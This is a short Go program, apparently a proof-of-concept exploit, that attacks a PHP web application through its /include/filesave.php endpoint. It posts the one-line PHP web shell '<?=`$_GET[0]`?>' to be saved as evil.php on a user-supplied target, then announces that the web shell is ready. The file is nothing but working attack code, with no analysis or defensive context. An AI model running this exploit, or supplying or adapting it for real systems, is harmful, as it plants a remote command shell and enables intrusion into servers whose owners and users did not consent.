package main

import (
    "io"
    "os"
    "flag"
    "bytes"
    "fmt"
    "net/http"
    "net/url"
    "strings"
)


func validateUrl(target string) bool {
    parsedURL, err := url.Parse(target)
    
    if err != nil {
        return false
    }

    if parsedURL.Scheme != "http" && parsedURL.Scheme != "https" {
        return false
    }

    return true
}


func makeRequest(target string) {
    reqUrl := target + "/include/filesave.php"

    // Data to be sent in the POST request
    data := url.Values{}
    data.Set("data", "<?=`$_GET[0]`?>")
    data.Set("file", "evil.php")

    // Encode the data
    encodedData := data.Encode()

    // Create a new POST request with the encoded data
    req, err := http.NewRequest("POST", reqUrl, bytes.NewBufferString(encodedData))
    if err != nil {
        fmt.Printf("Error creating request: %v\n", err)
        return
    }

    // Set the appropriate header for form data
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

    // Create an HTTP client and send the request
    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        fmt.Printf("Error sending request: %v\n", err)
        return
    }

    defer resp.Body.Close()

    respBody, err := io.ReadAll(resp.Body)
    if err != nil {
        fmt.Printf("Error getting response: %v\n", err)
        return
    }

    // fmt.Println("Response:", string(respBody))

    if strings.Contains(string(respBody), "ERROR:") {
        fmt.Printf("Exploit failed with error:\n%s", string(respBody))
    } else {
        fmt.Printf("Your webshell is ready at '%s/include/evil.php'.", target)
    }
}



func main() {
    flag.Usage = func() {
        fmt.Fprintf(os.Stderr, "Usage of %s:\n", os.Args[0])
        flag.PrintDefaults()
    }

    var target string
    flag.StringVar(&target, "t", "http://127.0.0.1", "Target URL of the form http://<IP_or_HOSTNAME>")
    flag.Parse()

    if validateUrl(target) {
        makeRequest(target)
    } else {
        fmt.Println("Invalid URL supplied.")
    }
}
